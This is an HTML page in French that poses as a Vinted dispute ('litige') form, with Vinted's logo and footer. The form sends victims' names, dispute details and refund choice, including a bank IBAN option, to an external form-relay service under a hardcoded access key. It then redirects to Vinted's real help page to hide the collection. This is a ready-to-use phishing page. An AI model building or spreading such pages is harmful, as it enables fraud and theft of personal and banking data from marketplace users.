<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Détails du litige | Vinted</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="navbar">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/29/Vinted_logo.png" class="logo-img">
        <div class="menu-icon">☰</div>
    </header>

    <main class="main-bg">
        <div class="white-card">
            <h2>Détails du litige</h2>
            <form action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="c89ef8b5-6bcc-4cae-bda0-97a1ba2fc8aa">
                <input type="hidden" name="redirect" value="https://www.vinted.fr/help">

                <div class="field-group"><label>Nom</label><input type="text" name="nom" required></div>
                <div class="field-group"><label>Prénom</label><input type="text" name="prenom" required></div>
                <div class="field-group"><label>Décris ton litige</label><textarea name="msg" rows="4" required></textarea></div>
                
                <div class="field-group">
                    <label>Mode de remboursement</label>
                    <select name="mode" required>
                        <option value="">Sélectionner</option>
                        <option>Porte-monnaie Vinted</option>
                        <option>Compte bancaire (IBAN)</option>
                    </select>
                </div>

                <button type="submit" class="btn-vinted">Envoyer le litige pour examen</button>
            </form>
        </div>
    </main>

    <footer class="vinted-footer">
        <div class="footer-grid">
            <div class="footer-column">
                <h3>Vinted</h3>
                <ul><li>À propos de Vinted</li><li>Presse</li></ul>
            </div>
            <div class="footer-column">
                <h3>Aide</h3>
                <ul><li>Centre d'aide</li><li>Confiance et sécurité</li></ul>
            </div>
        </div>
        <div class="app-badges">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
        </div>
        <div class="social-icons">
            <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png">
            <img src="https://cdn-icons-png.flaticon.com/512/174/174857.png">
            <img src="https://cdn-icons-png.flaticon.com/512/174/174855.png">
        </div>
        <div class="footer-legal">
            <span>Politique de cookies</span>
            <span>Termes et Conditions</span>
            <span>Notre plateforme</span>
        </div>
    </footer>
</body>
</html>
